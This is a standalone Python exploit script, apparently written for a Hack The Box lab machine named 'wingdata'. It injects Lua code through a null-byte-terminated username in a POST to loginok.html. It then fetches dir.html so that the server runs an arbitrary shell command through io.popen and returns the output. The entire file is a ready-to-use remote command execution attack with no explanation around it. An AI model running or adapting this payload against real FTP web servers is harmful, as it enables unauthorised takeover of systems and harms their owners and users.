#!/usr/bin/env python3
import requests
import sys
import urllib.parse

if len(sys.argv) < 3:
    print(f"Usage: {sys.argv[0]} http://ftp.wingdata.htb 'id'")
    sys.exit(1)

base_url = sys.argv[1].rstrip("/")
cmd = sys.argv[2]

session = requests.Session()

lua_payload = (
    'anonymous%00]]%0d'
    'local h = io.popen("' + cmd.replace('"', '\\"') + '")%0d'
    'local r = h:read("*a")%0d'
    'h:close()%0d'
    'print(r)%0d'
    '--'
)

data = f"username={urllib.parse.quote_from_bytes(urllib.parse.unquote_to_bytes(lua_payload), safe='%')}&password="

headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}

print("[*] Sending malicious login request...")
r1 = session.post(f"{base_url}/loginok.html", data=data, headers=headers, timeout=10)

print("[*] Triggering session execution...")
r2 = session.get(f"{base_url}/dir.html", timeout=10)

print(r2.text)
